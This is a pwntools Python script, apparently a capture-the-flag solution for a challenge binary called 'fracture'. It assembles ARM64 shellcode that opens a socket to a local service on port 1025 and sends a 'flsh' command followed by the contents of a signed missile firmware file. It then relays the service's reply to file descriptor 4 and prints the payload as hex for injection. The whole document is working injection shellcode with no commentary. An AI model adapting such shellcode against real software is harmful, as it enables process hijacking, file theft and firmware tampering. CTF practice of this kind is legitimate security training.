from pwn import *

elf = context.binary = ELF("/home/kali/cybertalent/fracture")

command = b"flsh"
firmware = "/firmware/missile.1.3.52.fw_signed"
shellcode = "sub sp, sp, #0x100\n"

submarine = p16(0)
missile = p16(0)
full_command = command + submarine + missile
shellcode += shellcraft.connect("127.0.0.1", 1025)
shellcode += shellcraft.write("x12", full_command, len(full_command))
shellcode += shellcraft.cat(firmware, "x12")
shellcode += shellcraft.pushstr("\x02".ljust(0x10, "\x00"), append_null=False)
shellcode += shellcraft.nanosleep("sp")
shellcode += shellcraft.read("x12", "sp", 0x100)
shellcode += shellcraft.mov("x11", "x0")
shellcode += shellcraft.close("x12")
shellcode += shellcraft.write(0x4, "sp", "x11")
shellcode += """
    add sp, sp, #0x100
    eor x0, x0, x0
    ret
"""

compiled_shellcode = asm(shellcode)

print(shellcode)
print("Length of shellcode:", len(compiled_shellcode))
print(enhex(compiled_shellcode))
